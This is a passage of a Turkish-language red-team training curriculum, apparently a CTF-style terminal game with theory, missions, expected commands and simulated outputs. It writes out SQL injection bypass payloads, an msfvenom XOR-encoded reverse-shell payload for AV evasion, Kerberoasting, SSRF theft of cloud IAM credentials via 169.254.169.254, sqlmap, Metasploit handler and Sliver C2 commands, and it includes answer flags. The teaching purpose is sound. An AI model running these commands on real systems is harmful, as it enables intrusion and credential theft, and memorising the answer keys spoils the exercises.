        "theory": "### Windows Mimarisi & Kayıt Defteri (Registry)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBinaya gizlice giren bir hırsızın, her sabah temizlikçinin paspasın altına koyduğu anahtarın yanına kendi gizli yedek anahtarını da iliştirmesidir (Kayıt Defteri Run Kalıcılığı). Sistem her başladığında hırsız içeri otomatik davet edilir!\n\nWindows ortamında sistemin ve yüklü yazılımların tüm davranışları hiyerarşik bir veritabanı olan **Registry (Kayıt Defteri)** içinde saklanır.\n\n#### 1. Kayıt Defteri Ağaçları (Hives):\n* **HKLM (HKEY_LOCAL_MACHINE):** Tüm bilgisayarı ilgilendiren donanım, sürücü ve güvenlik ayarları.\n* **HKCU (HKEY_CURRENT_USER):** O an oturum açmış kullanıcının ayarları.\n* **Kalıcılık (Persistence) Anahtarları:**\n  `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` anahtarına eklenen herhangi bir çalıştırılabilir dosya yolu, bilgisayar her açıldığında otomatik olarak çalışır.\n\n#### 2. Active Directory (AD) Giriş Seviyesi:\nŞirketlerin kullanıcıları, bilgisayarları ve izinleri tek bir merkezden yönettiği veritabanı altyapısıdır (Domain Controller).\n* **LDAP:** Dizin sorgulama protokolü.\n* **Kerberos:** Şifreleri ağdan geçirmeden bilet (Ticket) mekanizmasıyla yetki doğrulayan protokol.",
        "mission": "Sistem başlangıcında otomatik çalışan programları denetlemek için Run kayıt defteri anahtarını sorgulayın.",
        "expectedCommand": "reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"",
        "acceptedCommands": [
            "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "reg query HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
            "powershell Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        ],
        "hintExplanation": "<p><strong>reg query:</strong> Windows Kayıt Defteri (Registry) içindeki ayarları sorgulamak için kullanılan standart komuttur.</p>\n<p><strong>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run:</strong> Bilgisayar her açıldığında otomatik başlatılan programların kayıt yoludur. Saldırgan buraya zararlısını eklediğinde, sistem yeniden başlasa dahi kalıcı olur (Persistence).</p>",
        "terminalSuccessOutput": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n    SecurityHealth    REG_SZ    %windir%\\system32\\SecurityHealthSystray.exe\n    UpdaterService    REG_SZ    C:\\Users\\Public\\malicious_beacon.exe\n[FLAG] LFL{windows_registry_persistence_found}",
        "flag": "LFL{windows_registry_persistence_found}",
        "nextId": "red-104"
    },
    {
        "id": "red-104",
        "track": "red",
        "title": "Temel Kodlama & Betik: Python & Ağ Soketleri",
        "level": "1. Temel Altyapı",
        "badge": "SCRIPTING & EXPLOIT DEV",
        "theory": "### Bir Saldırganın Silahları: Betik Dilleri\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nKapıdaki nöbetçinin telsizini ödünç almak yerine, iki adet bakır tel ve pille kendi mini dinleme telsizinizi üretip portu dinlemeye almanızdır (Python Socket).\n\nHazır araçlar bir noktada güvenlik duvarlarına veya özel koruma mekanizmalarına takılır. Gerçek bir Red Teamer kendi aracını yazabilmeli veya var olan istismar kodunu düzenleyebilmelidir.\n\n* **Python:** Ağ soketleri oluşturma (`socket` modülü), HTTP isteklerini manipüle etme (`requests` kütüphanesi) ve hızlı PoC (Proof of Concept) yazımı için standart dildir.\n* **Bash:** Linux komut satırında ardışık komutları pipe (`|`) ile birbirine bağlayarak büyük veri yığınlarını anında filtreleme gücü sağlar.\n* **PowerShell:** Windows sistemlerin yönetim omurgasıdır. Doğrudan bellek üzerinde (.NET nesneleri kullanarak) çalıştığı için diske dosya yazmadan (fileless) saldırı simülasyonları yürütmekte kullanılır.",
        "mission": "Ters bağlantıları (reverse shell) karşılamak için 80 portunu dinleyen yerel Python soket dinleyicisini ('listener.py') başlatın.",
        "expectedCommand": "python3 listener.py",
        "acceptedCommands": [
            "python3 listener.py 80",
            "nc -lvnp 80",
            "python3 -m http.server 80"
        ],
        "hintExplanation": "<p><strong>python3:</strong> Python 3 yorumlayıcısını çalıştırır.</p>\n<p><strong>listener.py:</strong> Bilgisayarımızın ağ kartını dinlemeye alıp hedef sunucudan bize doğru gelecek ters kabuk (reverse shell) bağlantısını bekleyen hazır Python betiğimizdir. Bağlantı geldiğinde komut satırı açılır.</p>",
        "terminalSuccessOutput": "[+] Python3 soketi oluşturuldu (AF_INET, SOCK_STREAM)\n[+] 0.0.0.0:80 dinlemeye alındı (LISTENING)...\n[+] Bağlantı kabul edildi: 10.10.10.25:44321 -> Gelen Shell Doğrulandı!\n[FLAG] LFL{python_socket_automation_mastered}",
        "flag": "LFL{python_socket_automation_mastered}",
        "nextId": "red-201"
    },
    {
        "id": "red-201",
        "track": "red",
        "title": "Keşif & Bilgi Toplama: Pasif OSINT & Aktif Nmap",
        "level": "2. Ofansif Güvenlik",
        "badge": "RECONNAISSANCE & OSINT",
        "theory": "### Hedefi Tanımadan Saldıramazsınız\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir binayı soymadan önce binanın etrafındaki 65.535 pencerenin kollarına tek tek dokunup hangisinin aralık kaldığını ve hangi kilidin takılı olduğunu sessizce not almaktır (Nmap Taraması).\n\nKeşif aşaması sızma testinin en kritik evresidir; harcanan zamanın %70'i bu aşamada geçer.\n\n#### 1. Pasif Keşif (OSINT):\nHedef sistemle hiçbir doğrudan temas kurmadan kamuya açık kaynaklardan bilgi toplamaktır:\n* **Google Dorking:** Arama motoru filtreleri ile hassas dosya avı (`site:target.com filetype:pdf confidential`).\n* **Shodan:** İnternete bağlı tüm IoT cihazlarını, kameraları ve açık sunucuları port bazında indeksleyen arama motoru.\n\n#### 2. Aktif Keşif:\nHedefe doğrudan paket gönderilerek yapılan analizdir:\n* **Nmap Sürüm Taraması (`-sV`):** Açık portta hangi yazılımın hangi versiyonunun çalıştığını öğrenir.\n* **Varsayılan Scriptler (`-sC`):** Hedefte bilinen temel zafiyetleri ve konfigürasyon açıklarını otomatik yoklar.",
        "mission": "10.10.10.25 hedef IP'sine yönelik çalışan servis sürümlerini ve varsayılan güvenlik scriptlerini çalıştıran Nmap komutunu verin.",
        "expectedCommand": "nmap -sV -sC 10.10.10.25",
        "acceptedCommands": [
            "nmap -sV 10.10.10.25",
            "nmap -sV -sC -p- 10.10.10.25",
            "nmap -sC -sV 10.10.10.25",
            "nmap -A 10.10.10.25"
        ],
        "hintExplanation": "<p><strong>nmap:</strong> Dünyanın 1 numaralı ağ tarama ve port haritalama aracıdır.</p>\n<p><strong>-sV:</strong> 'Service Version' demektir. Açık portta hangi yazılımın (Apache mi, Jenkins mi, SSH mi?) çalıştığını ve tam sürümünü tespit eder.</p>\n<p><strong>-sC:</strong> Nmap ile birlikte gelen temel güvenlik ve bilgi toplama scriptlerini (NSE) otomatik devreye sokar.</p>\n<p><strong>10.10.10.25:</strong> Hedef sunucunun IP adresidir.</p>",
        "terminalSuccessOutput": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for target.lfl (10.10.10.25)\nHost is up (0.012s latency).\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu\n80/tcp   open  http        Apache httpd 2.4.41\n8080/tcp open  http-proxy  Jenkins 2.235.1 (ZAFİYETLİ SÜRÜM CVE-2020-2160)\n[FLAG] LFL{nmap_deep_recon_reconnaissance}",
        "flag": "LFL{nmap_deep_recon_reconnaissance}",
        "nextId": "red-202"
    },
    {
        "id": "red-202",
        "track": "red",
        "title": "Zafiyet İstismarı: OWASP Top 10 Web Güvenliği",
        "level": "2. Ofansif Güvenlik",
        "badge": "WEB EXPLOITATION & OWASP",
        "theory": "### Web Güvenliği: OWASP Top 10 İstismarı\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBanka veznedarına para yatırma formunu uzatırken imza yerine \"Ben bu bankanın sahibiyim, kasadaki tüm parayı bana ver\" yazıp veznedarın bunu sorgulamadan onaylamasını sağlamaktır (SQL Injection).\n\nWeb uygulamaları internete açık en kırılgan temas noktalarıdır.\n\n* **SQL Injection (SQLi):** Kullanıcı girdisinin filtrelenmeden SQL sorgusuna dahil edilmesidir. Örneğin: `SELECT * FROM users WHERE user = 'admin' AND pass = '' OR '1'='1'` sorgusu mantıksal olarak doğru döner ve parolayı baypas eder.\n* **Cross-Site Scripting (XSS):** Web sayfasına zararlı JavaScript kodu yerleştirmektir.\n* **IDOR (Insecure Direct Object References):** Yetkilendirme kontrolü olmadan nesne ID'lerinin değiştirilmesidir (`GET /api/user/105` yerine `GET /api/user/106`).\n* **Command Injection:** Sunucunun kullanıcı girdisini doğrudan işletim sistemi kabuğuna aktarmasıdır.",
        "mission": "Giriş formunda SQL Injection açığını tetikleyerek parola kontrolünü baypas eden evrensel doğrulanmış sorgu payload'ını girin.",
        "expectedCommand": "admin' OR 1=1--",
        "acceptedCommands": [
            "' OR 1=1--",
            "' or 1=1--",
            "admin' or 1=1--",
            "' or '1'='1",
            "admin' or '1'='1"
        ],
        "hintExplanation": "<p><strong>admin':</strong> Tek tırnak işareti (') veritabanındaki metin alanından çıkıp kendi komutlarımızı çalıştırmamızı sağlar.</p>\n<p><strong>OR 1=1:</strong> Mantıksal VEYA kuralıdır. '1 sayısı 1'e eşittir' şartı her zaman DOĞRU (True) olduğundan, parola yanlış olsa bile sorgu başarıyla sonuçlanır!</p>\n<p><strong>--:</strong> SQL dilinde bu işaretten sonra gelen tüm şifre denetim kodlarını geçersiz bir açıklama satırına dönüştürür.</p>",
        "terminalSuccessOutput": "[+] SİSTEME GİRİŞ YAPILDI!\nSorgu: SELECT * FROM Users WHERE username='admin' OR 1=1--' AND pass='...'\nHoş Geldin Yönetici! Oturum Yetkisi: Level-0 System Admin\n[FLAG] LFL{owasp_sqli_auth_bypass_success}",
        "flag": "LFL{owasp_sqli_auth_bypass_success}",
        "nextId": "red-203"
    },
    {
        "id": "red-203",
        "track": "red",
        "title": "Sistem İstismarı & Metasploit Framework",
        "level": "2. Ofansif Güvenlik",
        "badge": "METASPLOIT & EXPLOIT FRAMEWORK",
        "theory": "### Sistem İstismarı: Zafiyetleri Tetiklemek\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nAçık bulduğunuz havalandırma borusundan içeri özel bir telsiz fırlatıp, içerideki sistemin otomatik olarak sizin telefonunuza gizli bir hat bağlamasını (Reverse Shell) sağlamaktır.\n\nBir zafiyet keşfedildikten sonra hedef sistem üzerinde kod çalıştırmak (RCE - Remote Code Execution) için istismar kodları (exploit) kullanılır.\n\n#### Metasploit Mimarisi:\n* **Exploit Modülleri:** Zafiyeti tetikleyerek bellekte açık kapı oluşturan kodlar.\n* **Payloads:** İstismar başarılı olduktan sonra hedefte çalışan kod parçası (Meterpreter vb.).\n* **Meterpreter:** Hedef sistemde diskte dosya bırakmadan doğrudan bellek içinde yaşayan gelişmiş bir sızma ajanıdır.",
        "mission": "Metasploit konsolunda dışarıdan gelecek ters bağlantıları (reverse shell) karşılayacak genel çoklu dinleyici modülünü seçin.",
        "expectedCommand": "use exploit/multi/handler",
        "acceptedCommands": [
            "use multi/handler",
            "handler",
            "msfconsole -x \"use exploit/multi/handler\""
        ],
        "hintExplanation": "<p><strong>use:</strong> Metasploit konsolu içinde kullanmak istediğimiz modülü aktif etme komutudur.</p>\n<p><strong>exploit/multi/handler:</strong> Hedefe fırlattığımız zararlı yazılım (payload) geriye doğru bizim IP adresimize bağlandığında onu karşılayan ve bize tam yetkili komut satırı (Meterpreter shell) açan genel dinleyici modülüdür.</p>",
        "terminalSuccessOutput": "[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\nPAYLOAD => windows/x64/meterpreter/reverse_tcp\n[*] Started reverse TCP handler on 0.0.0.0:4444 \n[FLAG] LFL{metasploit_handler_ready_for_shell}",
        "flag": "LFL{metasploit_handler_ready_for_shell}",
        "nextId": "red-204"
    },
    {
        "id": "red-204",
        "track": "red",
        "title": "Yetki Yükseltme (Privilege Escalation)",
        "level": "2. Ofansif Güvenlik",
        "badge": "PRIVESC & POST EXPLOITATION",
        "theory": "### Normal Kullanıcıdan Root/SYSTEM Yetkilerine\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nSıradan bir ziyaretçi kimliğiyle girip, yerdeki unutulmuş anahtarla genel müdür odasını açmaktır (Privilege Escalation).\n\nBir sisteme ilk girdiğinizde genellikle `www-data` veya yetkisiz standart bir kullanıcı hesabı elde edersiniz. Tam kontrol için işletim sistemi izin basamaklarını tırmanmanız gerekir.\n\n#### 1. Linux PrivEsc Vektörleri:\n* **Sudo İzinleri (`sudo -l`):** Kullanıcının parola girmeden çalıştırabileceği root komutları. Örneğin `sudo vim` izni varsa `:!sh` yazılarak root kabuğu alınır.\n* **Zafiyetli Kernel:** Çekirdek bellek sızıntıları (Dirty COW, PwnKit).\n* **Yetkisiz Yazılabilir Servisler:** Başlangıçta çalışan servis dosyalarına yazma hakkı.",
        "mission": "Linux kabuğunda kullanıcının şifresiz sudo çalıştırma yetkilerini listeleyen denetim komutunu çalıştırın.",
        "expectedCommand": "sudo -l",
        "acceptedCommands": [
            "sudo --list",
            "sudo -l -U cadet"
        ],
        "hintExplanation": "<p><strong>sudo:</strong> Bir komutu en yetkili sistem yöneticisi (root) olarak çalıştırma emridir.</p>\n<p><strong>-l:</strong> 'List' demektir. Mevcut kullanıcının şifre girmeden (NOPASSWD) hangi root komutlarını çalıştırabileceğini listeler. Eğer listede Python veya vim varsa, tek satırda sistem yöneticisi olunur!</p>",
        "terminalSuccessOutput": "Matching Defaults entries for cadet on lfl-terminal:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:...\nUser cadet may run the following commands on lfl-terminal:\n    (root) NOPASSWD: /usr/bin/python3 /opt/automation/backup.py\n[CRITICAL] Python scripti üzerinden yetki yükseltme kapısı açık!\n[FLAG] LFL{sudo_privesc_vector_analyzed}",
        "flag": "LFL{sudo_privesc_vector_analyzed}",
        "nextId": "red-301"
    },
    {
        "id": "red-301",
        "track": "red",
        "title": "Active Directory Güvenliği & Kerberoasting",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "ACTIVE DIRECTORY & KERBEROS",
        "theory": "### Kurumsal Ağların %90'ı: Active Directory\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nLunapark biletçisinden bilet isteyip, o biletin arkasındaki gizli damgayı eve götürüp büyüteçle çözmeye çalışmaktır (Kerberoasting).\n\nKlasik penetrasyon testinde amaç açığı bulup raporlamaktır; Red Team'de ise hedef Domain Controller ve kurumun en değerli varlıklarıdır.\n\n#### 1. Kerberoasting Saldırısı:\nActive Directory'de servis hesaplarına (SQL Server, IIS vb.) SPN (Service Principal Name) atanır. Herhangi bir domain kullanıcısı bu servis için etki alanı denetleyicisinden (DC) bir **TGS (Ticket Granting Service)** bileti isteyebilir. Bu bilet servis hesabının NTLM parolasıyla şifrelenmiştir.\n* Saldırgan bileti belleğe indirir.\n* Kendi bilgisayarına aktararak sözlük saldırısıyla (Hashcat) offline olarak şifresini çözer.",
        "mission": "Impacket araç setini kullanarak domaindeki SPN atanmış servis hesaplarının Kerberos biletlerini çeken komutu çalıştırın.",
        "expectedCommand": "GetUserSPNs.py corp.local/jdoe:Password123 -request",
        "acceptedCommands": [
            "GetUserSPNs.py -request",
            "python3 GetUserSPNs.py corp.local/jdoe:Password123 -request",
            "impacket-GetUserSPNs corp.local/jdoe:Password123 -request"
        ],
        "hintExplanation": "<p><strong>GetUserSPNs.py:</strong> Impacket kütüphanesinin Kerberoasting saldırısı için geliştirdiği hazır araçtır.</p>\n<p><strong>corp.local/jdoe:Password123:</strong> Ağdaki sıradan bir şirket personelinin etki alanı kullanıcı adı ve parolasıdır.</p>\n<p><strong>-request:</strong> SQL Server gibi servisler için Domain Controller'dan şifrelenmiş bilet (TGS) ister. Bu bilet bilgisayarımıza indirilir ve Hashcat ile çevrimdışı kırılarak servis yöneticisinin parolası ele geçirilir.</p>",
        "terminalSuccessOutput": "Impacket v0.11.0 - Copyright 2023 Fortra\nServicePrincipalName: MSSQLSvc/db01.corp.local:1433\nHash formatı: $krb5tgs$23$*MSSQLSvc*corp.local...\n[+] TGS BİLETİ BAŞARIYLA ÇEKİLDİ! Hashcat mod: 13100\n[FLAG] LFL{kerberoasting_tgs_ticket_captured}",
        "flag": "LFL{kerberoasting_tgs_ticket_captured}",
        "nextId": "red-302"
    },
    {
        "id": "red-302",
        "track": "red",
        "title": "Sosyal Mühendislik & Kimlik Avı (Phishing)",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "SOCIAL ENGINEERING & GOPHISH",
        "theory": "### En Zayıf Halka İnsandır\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBankanın güvenlik görevlisi kılığına girip kapıdaki personele \"Sistem güncelleniyor, parolanızı şu kağıda yazın\" diyerek kimlik bilgilerini toplamaktır (Phishing).\n\nMükemmel yapılandırılmış güvenlik duvarları ve yamalanmış sunucular dahi bir personelin sahte bir bağlantıya tıklayıp parolasını girmesini engelleyemez.\n\n* **Oltalama (Phishing) Altyapısı:** Gophish gibi araçlarla şirket içi duyuru veya acil parola sıfırlama temalı senaryolar kurgulanır.\n* **İki Faktörlü Kimlik Doğrulamayı (2FA/MFA) Aşmak:** Reverse Proxy tabanlı araçlar (Evilginx2 gibi), kurban geçerli oturum açtığında üretilen oturum çerezini (Session Token) ele geçirir ve 2FA'yı baypas eder.",
        "mission": "Gophish simülasyon sunucusunun durumunu ve kampanya istatistiklerini denetleyen yönetim komutunu çalıştırın.",
        "expectedCommand": "gophish --status",
        "acceptedCommands": [
            "systemctl status gophish",
            "gophish status",
            "gophish"
        ],
        "hintExplanation": "<p><strong>gophish:</strong> Açık kaynak kurumsal phishing simülasyon yazılımıdır.</p>\n<p><strong>--status:</strong> Kampanyada kaç personele sahte e-posta gönderildiğini, kaçının bağlantıya tıkladığını ve kaçının parolasını kaptırdığını gösteren canlı panoyu ekrana getirir.</p>",
        "terminalSuccessOutput": "[GOPHISH CONTROLLER] Servis: Dinlemede (Port 3333)\nKampanya: '2026 Q4 İK Parola Güncelleme'\nGönderilen: 150 | Açılan: 98 | Tıklanan: 42 | Kimlik Veren: 19\n[FLAG] LFL{social_engineering_campaign_metrics}",
        "flag": "LFL{social_engineering_campaign_metrics}",
        "nextId": "red-303"
    },
    {
        "id": "red-303",
        "track": "red",
        "title": "Savunma Sistemlerini Atlama (AV/EDR Bypass)",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "EDR BYPASS & OBFUSCATION",
        "theory": "### Tespit Edilmeden İlerlemek: EDR Bypass\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nX-Ray cihazından geçerken metal bıçağı alüminyum folyoya ve çikolata paketine sarıp (XOR Obfuscation) tarayıcının alarm vermesini engellemektir (AV/EDR Bypass).\n\nKlasik antivirüsler dosyanın SHA-256 hash'ine ve statik imzasına bakar. Modern EDR sistemleri ise belleği, API çağrılarını ve proses davranışlarını (Hooking) denetler.\n\n#### Bypass Teknikleri:\n* **Kod Karartma (Obfuscation):** Değişken isimlerini anlamsızlaştırma, stringleri XOR ile şifreleme.\n* **Direct Syscalls:** Windows API'leri güvenlik araçları tarafından dinlendiği için doğrudan çekirdeğe (kernel) syscall numarasıyla geçiş yaparak EDR'ın gözünü kör etme.",
        "mission": "Zararlı payload'ı şifreleyerek statik antivirüs imza kontrolünü baypas eden 'obfuscator.py' betiğini çalıştırın.",
        "expectedCommand": "python3 obfuscator.py payload.bin",
        "acceptedCommands": [
            "python3 obfuscator.py payload.bin -k 0xAA",
            "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x64/xor_dynamic -f exe -o payload.exe",
            "python3 obfuscator.py"
        ],
        "hintExplanation": "<p><strong>python3 obfuscator.py:</strong> Zararlı ikili dosyanın içindeki bilinen imza kalıplarını şifreleyerek karartan araçtır.</p>\n<p><strong>payload.bin:</strong> Ham istismar kodudur. Antivirüsler dosyanın bilinen harflerini ve hash'ini tanır; XOR ile şifrelendiğinde antivirüs bunu rastgele veri sanır ve alarm vermez.</p>",
        "terminalSuccessOutput": "[+] Shellcode boyutu: 512 bayt\n[+] XOR 0xAA anahtarı ile şifrelendi.\n[+] Statik imza entropisi: 7.92 (İmza AV tarayıcılarından başarıyla gizlendi)\n[FLAG] LFL{edr_antivirus_evasion_bypass}",
        "flag": "LFL{edr_antivirus_evasion_bypass}",
        "nextId": "red-304"
    },
    {
        "id": "red-304",
        "track": "red",
        "title": "Komuta Kontrol Merkezleri (C2 Frameworks)",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "C2 FRAMEWORKS & PERSISTENCE",
        "theory": "### Sızılan Sistemleri Uzaktan Yönetmek: C2 Mimarisi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nEle geçirilen kalenin içine gizli bir casus yerleştirip, o casusun her 30 saniyede bir ormana sinyal göndererek \"Komutanım, yeni emriniz nedir?\" diye sormasıdır (C2 Beacon).\n\nBir sunucuya veya istemciye sızdıktan sonra sürekli orada kalmak ve güvenli iletişim kurmak için **Command and Control (C2)** yapıları kullanılır.\n\n* **Ajan (Beacon/Agent):** Hedef sistemde arka planda sessizce yaşayan programdır. Belirli aralıklarla C2 sunucusuna \"yeni görev var mı?\" diye sorar.\n* **Modern C2 Çatıları:** \n  * **Sliver:** Go tabanlı, mTLS ve DNS protokolleri üzerinden haberleşebilen güçlü açık kaynak C2.\n  * **Havoc:** Modern arayüzlü, C++ tabanlı gelişmiş Red Team frameworkü.",
        "mission": "Sliver C2 istemcisinde aktif kurban oturumlarını (sessions) listeleyen komutu girin.",
        "expectedCommand": "sliver-client sessions",
        "acceptedCommands": [
            "sessions",
            "sliver sessions",
            "sliver-client beacons",
            "sliver > sessions"
        ],
        "hintExplanation": "<p><strong>sliver-client:</strong> Red Team operasyonlarında sızılan yüzlerce bilgisayarı uzaktan tek merkezden yöneten komuta merkezi istemcisidir.</p>\n<p><strong>sessions:</strong> Hedef bilgisayarlardan komuta merkezimize gizlice bağlanan ve emir bekleyen canlı ajanların (beacon) listesini döker.</p>",
        "terminalSuccessOutput": "[*] Active sessions:\nID         Name       Transport   Remote Address       Hostname     Username\n8f12a14    beacon_w1  mtls        192.168.1.120:51221  CORP-PC01    corp\\finance_mgr\n[STATUS] C2 tüneli aktif ve şifrelenmiş.\n[FLAG] LFL{c2_framework_sliver_operations_complete}",
        "flag": "LFL{c2_framework_sliver_operations_complete}",
        "nextId": "red-305"
    },
    {
        "id": "red-305",
        "track": "red",
        "title": "Web İleri İstismar: SSRF & Bulut Metadata Sızıntısı",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "SSRF & CLOUD METADATA EXPLOIT",
        "theory": "### Sunucuyu Truva Atı Olarak Kullanmak: SSRF (Server-Side Request Forgery)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nŞirketin kapısındaki güvenlik görevlisi içeriye yabancı kimseyi almaz. Ancak şirketin kendi resmi kuryesine sonsuz güvenir. Bir saldırgan kuryenin elindeki sipariş kağıdına gizlice 'Git muhasebe odasındaki kasayı aç ve içindeki evrakı bana getir' diye yazar. Güvenlik kuryeyi durdurmaz ve saldırgan içeri girmeden kasayı soymuş olur.\n\n#### Bulut Ortamlarında SSRF Felaketi:\nAWS, Azure ve GCP gibi bulut sunucularında `169.254.169.254` adresinde sunucu kimliklerini taşıyan bir 'Link-Local Metadata' servisi çalışır. Sunucuya bu adresi çektirebilen saldırgan, geçici IAM anahtarlarını (SecretAccessKey, Token) saniyeler içinde çalar.",
        "mission": "Güvensiz proxy parametresini kullanarak AWS metadata servisinden IAM güvenlik anahtarlarını sızdırmak için curl 'http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' komutunu çalıştırın.",
        "expectedCommand": "curl 'http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
        "acceptedCommands": [
                "curl 'http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
                "curl \"http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"",
                "curl http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        ],
        "hintExplanation": "<p><strong>SSRF:</strong> Sunucunun kendi iç ağına saldırgan adına istek yapmaya zorlanmasıdır.</p><p><strong>169.254.169.254:</strong> Bulut sunucularının yerel metadata IP adresidir.</p>",
        "terminalSuccessOutput": "HTTP/1.1 200 OK\n{\n  \"Code\" : \"Success\",\n  \"Type\" : \"AWS-HMAC\",\n  \"AccessKeyId\" : \"ASIAZ6EXAMPLEKEY2026\",\n  \"SecretAccessKey\" : \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  \"Token\" : \"AQoDYXdzEJr1...\"\n}\n[KRİTİK İHLAL!] Bulut IAM geçici kimlik bilgileri sızdırıldı!\n[FLAG] LFL{red_ssrf_cloud_metadata_iam_keys_compromised}",
        "flag": "LFL{red_ssrf_cloud_metadata_iam_keys_compromised}",
        "nextId": "red-306"
},
    {
        "id": "red-306",
        "track": "red",
        "title": "SQLi İleri Düzey: Time-Based & Blind SQL Injection",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "ADVANCED BLIND SQLI",
        "theory": "### Körleme Veritabanı Sızıntısı: Ekranda Hata Yoksa Ne Yapılır?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nGözleri bağlı bir rehineye soru sorduğunuzu hayal edin. Rehine konuşamıyor ama 'Doğruysa 5 saniye bekle, yanlışsa hemen elini salla' kuralını koyuyorsunuz. Zaman tutarak rehinenden tüm şifreyi harf harf öğrenmek gibidir.\n\n#### Time-Based SQLi Mantığı:\nWeb uygulaması SQL hatasını veya sorgu çıktısını ekranda göstermez. Ancak veritabanına `IF(ASCII(SUBSTRING(password,1,1))=97, SLEEP(5), 0)` enjekte edilirse; eğer ilk harf 'a' (97) ise sunucu 5 saniye gecikmeli yanıt verir. Bu gecikme verinin doğrulandığını kanıtlar.",
        "mission": "sqlmap aracını kullanarak zaman tabanlı körleme tekniğiyle veritabanı adını çekmek için sqlmap -u 'http://target.local/item?id=1' --technique=T --batch --current-db komutunu çalıştırın.",
        "expectedCommand": "sqlmap -u 'http://target.local/item?id=1' --technique=T --batch --current-db",
        "acceptedCommands": [
                "sqlmap -u 'http://target.local/item?id=1' --technique=T --batch --current-db",
                "sqlmap -u \"http://target.local/item?id=1\" --technique=T --batch --current-db",
                "sqlmap -u http://target.local/item?id=1 --technique=T --batch --current-db"
        ],
        "hintExplanation": "<p><strong>--technique=T:</strong> Yalnızca Time-Based Blind (Zaman Gecikmeli) tekniğini uygular.</p><p><strong>--current-db:</strong> Aktif veritabanının adını harf harf çıkarır.</p>",
        "terminalSuccessOutput": "[*] testing connection to the target URL\n[*] confirming that parameter 'id' is dynamic\n[+] parameter 'id' is vulnerable to time-based blind SQL injection (SLEEP)\n[*] retrieved query response latency: 5.02s\ncurrent database: 'production_lfl_core'\n[BAŞARILI] Time-based blind zafiyetiyle veritabanı adı sızdırıldı!\n[FLAG] LFL{red_time_based_blind_sqli_extracted}",
        "flag": "LFL{red_time_based_blind_sqli_extracted}",
        "nextId": "red-307"
},
    {
        "id": "red-307",
        "track": "red",
        "title": "Active Directory: BloodHound ile En Kısa Domain Admin Yolu",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "BLOODHOUND & GRAPH RECON",
        "theory": "### Active Directory Labirentini Çözmek: BloodHound ve Grafik Teorisi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nDevasa bir gökdelende en alt kattaki stajyerin odasından en üst kattaki CEO'nun anahtarına giden gizli kapıları gösteren 3 boyutlu mimari haritadır. Bir kullanıcının hangi gruba üye olduğu, o grubun hangi bilgisayarda 'GenericAll' yetkisine sahip olduğu gibi karmaşık ilişkileri haritalar.\n\n#### Cypher Sorguları:\nBloodHound, Neo4j veritabanını kullanarak `Find Shortest Paths to Domain Admins` sorgusuyla 10 adımda stajyerden Domain Admin tahtına giden zafiyetli zinciri saniyede bulur.",
        "mission": "corp.local etki alanındaki tüm kullanıcı, grup ve ACL ilişkilerini çekmek için bloodhound-python -u analyst -p Pass123! -d corp.local -c All -ns 10.10.1.5 komutunu çalıştırın.",
        "expectedCommand": "bloodhound-python -u analyst -p Pass123! -d corp.local -c All -ns 10.10.1.5",
        "acceptedCommands": [
                "bloodhound-python -u analyst -p Pass123! -d corp.local -c All -ns 10.10.1.5",
                "bloodhound-python -u analyst -p Pass123! -d corp.local -c All",
                "bloodhound-python -u analyst -p 'Pass123!' -d corp.local -c All -ns 10.10.1.5"
        ],
        "hintExplanation": "<p><strong>bloodhound-python:</strong> Linux üzerinden AD nesnelerini toplayan SharpHound alternatifidir.</p><p><strong>-c All:</strong> Tüm oturum, grup, ACL ve konteyner verilerini toplar.</p>",
        "terminalSuccessOutput": "[+] Connecting to LDAP server: 10.10.1.5\n[+] Found 452 users, 84 groups, 120 computers\n[+] Dumping domain trust relationships...\n[+] WriteDacl on 'Tier-1-Admins' -> GenericAll on 'Domain Admins'\n[+] SHORTEST PATH TO DOMAIN ADMIN: 3 HOP BULUNDU!\n[FLAG] LFL{red_bloodhound_shortest_path_to_da_mapped}",
        "flag": "LFL{red_bloodhound_shortest_path_to_da_mapped}",
        "nextId": "red-308"
},
    {
        "id": "red-308",
        "track": "red",
